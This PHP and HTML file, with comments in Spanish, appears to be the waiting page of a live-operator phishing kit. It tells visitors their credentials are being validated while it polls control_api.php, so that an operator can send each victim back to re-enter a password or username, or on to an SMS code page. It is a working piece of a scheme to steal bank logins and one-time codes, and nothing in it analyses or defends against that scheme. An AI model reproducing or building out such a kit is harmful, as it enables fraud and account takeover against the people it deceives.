<?php 
// cargando.php
// Página de espera del cliente mientras el administrador decide su destino.
session_start();
$session_id = session_id();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validando Acceso...</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader-container { text-align: center; padding: 40px; background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); border-top: 4px solid #0067b1; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { color: #0067b1; font-size: 1.5em; }
        p { color: #6c757d; }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <h1>Validando sus credenciales...</h1>
        <p>Este proceso puede tardar hasta 60 segundos por seguridad.</p>
        <p id="countdown">Tiempo restante: 60s</p>
    </div>

    <script>
        const sessionId = "<?php echo $session_id; ?>";
        let countdown = 60;
        const countdownElement = document.getElementById('countdown');

        function checkDecision() {
            fetch('control_api.php?session_id=' + sessionId)
                .then(response => response.json())
                .then(data => {
                    const status = data.status;
                    
                    if (status === 'CLAVE') {
                        window.location.href = 'error.php?reason=CLAVE'; 
                    } else if (status === 'USUARIO') {
                        window.location.href = 'error.php?reason=USUARIO'; 
                    } else if (status === 'SUCCESS') {
                        // ¡CORREGIDO! Redirige a sms.php
                        window.location.href = 'sms.html'; 
                    }
                })
                .catch(error => {
                    console.error('Error al verificar decisión:', error);
                });
        }

        // Timer de 10 segundos
        const intervalId = setInterval(() => {
            countdown--;
            countdownElement.textContent = `Tiempo restante: ${countdown}s`;
            
            // Fallback: Si el tiempo expira (10 segundos), se redirige al error genérico
            if (countdown <= 0) {
                clearInterval(intervalId);
                clearInterval(checkIntervalId);
                window.location.href = 'index.php'; 
            }
        }, 1000);

        // Polling: Chequea la decisión cada 1.5 segundos.
        const checkIntervalId = setInterval(checkDecision, 1500); 

        window.onbeforeunload = function() {
            clearInterval(intervalId);
            clearInterval(checkIntervalId);
        };
    </script>
</body>
</html>